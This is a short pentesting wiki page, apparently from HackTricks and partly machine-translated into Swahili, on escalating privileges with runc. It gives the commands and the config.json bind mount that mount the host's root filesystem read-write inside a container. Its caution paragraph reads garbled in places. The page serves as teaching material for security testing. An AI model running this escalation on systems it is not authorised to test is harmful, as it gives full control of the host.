# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basic information

Ikiwa unataka kujifunza zaidi kuhusu **runc** angalia ukurasa ufuatao:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Ikiwa unapata kwamba `runc` imewekwa kwenye mwenyeji unaweza kuwa na uwezo wa **kuendesha kontena ukitumia folda ya mizizi / ya mwenyeji**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Hii haitafanya kazi kila wakati kwani operesheni ya default ya runc ni kukimbia kama root, hivyo kukimbia kama mtumiaji asiye na haki haiwezi kufanya kazi (isipokuwa una usanidi usio na root). Kufanya usanidi usio na root kuwa wa default si wazo zuri kwa ujumla kwa sababu kuna vizuizi vingi ndani ya kontena zisizo na root ambavyo havihusiani na kontena zisizo na root. 

{{#include ../../banners/hacktricks-training.md}}
